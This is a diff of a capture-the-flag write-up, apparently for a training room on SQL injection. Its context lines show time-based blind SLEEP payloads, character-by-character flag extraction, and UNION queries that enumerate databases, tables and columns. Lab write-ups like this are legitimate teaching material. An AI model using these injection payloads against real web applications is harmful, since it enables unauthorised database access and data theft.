@@ -58,6 +58,7 @@ Normal basic ones didn't work but here:
 We find a whole list of ones and I tested a few that works
 
 - This Time based one worked for instance:
+
 ```bash
 'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 
@@ -70,6 +71,7 @@ We find a whole list of ones and I tested a few that works
 ![image9](../resources/1c58b60f3be74c7d9ead0cdcb14a011f.png)
 
 - To build on this query we can do:
+
 ```bash
 ' AND (SELECT sleep(5) from information_schema.tables where table_schema = "sqhell_1") and '1'='1
 
@@ -87,6 +89,7 @@ The flags start with THM
 The length of the flags seem to be 42 characters
 
 - We can test if this is the case:
+
 ```bash
 ' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1
 
@@ -169,6 +172,7 @@ if __name__ == "__main__":
 - Nothing gets displayed so simple union isn't going to work
 
 - I tried the same SQL time-based blind query from flag 2:
+
 ```bash
 'AND (SELECT \* FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 
@@ -180,6 +184,7 @@ And it worked!
 ![image16](../resources/6c36d817008b493c9f4253e239678d45.png)
 
 **<u>Script:</u>**
+
 ```python
 import requests
 import sys
@@ -241,6 +246,7 @@ Hint:
 
 ![image17](../resources/a2818b74dbd14e40bac93271131997dd.png)
 - If we edit the query in Burp - we can actually use the simple UNION query to determine the number of columns:
+
 ```bash
 union select 1,2,3 -- -
 
@@ -259,6 +265,7 @@ Although nothing gets displayed on the page
 **The "1" and "2" gets reflected in the page**
 
 - So if we want to enumerate the database:
+
 ```bash
 union select database(),2,3 -- -
 
@@ -272,6 +279,7 @@ union select 1,group_concat(flag),3 from flag -- -
 - The hint is a quote from the movie **Inception**
 
 - If we follow the hint and try to add a query inside a query:
+
 ```bash
 union select "1 union select 1",2,3 -- -
 
@@ -282,6 +290,7 @@ It works but no posts are displayed
 ![image21](../resources/8374d5ee354b4a4b9fc54f62aa7457b8.png)
 
 - If we build the UNION query like normal to determine the number of columns displayed:
+
 ```bash
 union select "1 union select 1,2,3,4",2,3 -- -
 
@@ -292,6 +301,7 @@ union select "1 union select 1,2,3,4",2,3 -- -
 When we get to 4 columns - another post field is displayed, reflecting the number 2
 
 - If we now try to view the flag:
+
 ```bash
 union select "1 union select 1,flag,3,4 from flag",2,3 -- -
 
@@ -351,6 +361,7 @@ version (ubuntu) - **8.0.23**
 ![image32](../resources/d868b6ca3705408791dc268eaf48efaf.png)
 
 - Building on that we can get the table names:
+
 ```bash
 UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = "sqhell_5"
 
@@ -362,6 +373,7 @@ UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where
 **union all select 1,group_concat(PATH,"\n"),3,4 from information_schema.INNODB_DATAFILES**
 
 - Query columns:
+
 ```bash
 UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns where table_name = "flag"
 
@@ -370,6 +382,7 @@ UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns whe
 ![image34](../resources/53932b23a18c4e5e8369235ace11ff60.png)
 
 - Get flag:
+
 ```bash
 UNION SELECT 1,group_concat(flag),3,4 from flag
 
